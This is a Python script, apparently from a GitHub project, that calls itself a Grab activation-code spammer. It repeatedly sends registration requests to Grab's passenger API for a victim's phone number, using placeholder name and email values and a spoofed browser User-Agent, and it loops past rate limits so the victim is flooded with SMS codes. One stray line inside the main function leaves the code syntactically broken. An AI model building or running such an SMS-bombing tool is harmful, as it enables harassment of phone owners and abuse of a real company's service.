#!/usr/bin/env python3
# -*- code: utf-8 -*-

import sys
import time

import click
import requests

__author__ = 'loncat <me@lcat.dev>'

DEFAULT_REQ_DELAY = 60
GAC_REQ_URL = 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'


@click.command()
@click.argument('phone_num', type=int)
@click.option('--delay',
              '-dl',
              default=DEFAULT_REQ_DELAY,
              help='delay between each request wave',
              type=int)
@click.option('--limit', '-li', help='amount of request to send', type=int)
@click.option('--country_code',
              '-cc',
              help='phone number country code',
              default='ID')
def main(phone_num, delay, limit, country_code):
    """
    This script will repeatedly send Grab Activation Code (GAC) to PHONE_NUM.
    PHONE_NUM must be a phone number in international format
    (example: 6281323323232 with 62 prefix as the country code)
    """
    i = 0

                fg='cyan')
    while i == 0 or i < limit:
        res, reason, wait = send_gac_req(phone_num, country_code)
        long_res = 'success' if res else 'failed'
        click.secho(f'i = {i} ~> {long_res}: {reason}, sleep: {wait}',
                    fg='green' if res else 'red')
        if wait and (i == 0 or i < limit):
            time.sleep(delay)
        i += 1
    return


def send_gac_req(phone_num, cc):
    req_kwargs = {
        'data': {
            'phoneNumber': phone_num,
            'countryCode': cc,
            'name': 'test',
            'email': 'mail@mail.com',
            'deviceToken': '*'
        },
        'headers': {
            'User-Agent':
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ('
             '+KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36')
        }
    }
    try:
        req = requests.post(GAC_REQ_URL, **req_kwargs)
    except requests.exceptions.RequestException:
        return False, 'exception', True
    if req.status_code == 429:
        return False, 'reached limit', True
    elif req.status_code == 200:
        return True, '200 ok', True
    else:
        raise NotImplementedError(
            'something went wrong, please submit an issue.')


if __name__ == '__main__':
    click.secho(f'{sys.argv[0]} \u2014 Grab Activation Code (GAC) spammer',
                fg='black',
                bg='green')
    click.echo(' author\tloncat <me@lcat.dev>')
    click.echo(' url\thttps://github.com/p4kl0nc4t/Spammer-Grab\n')
    main()
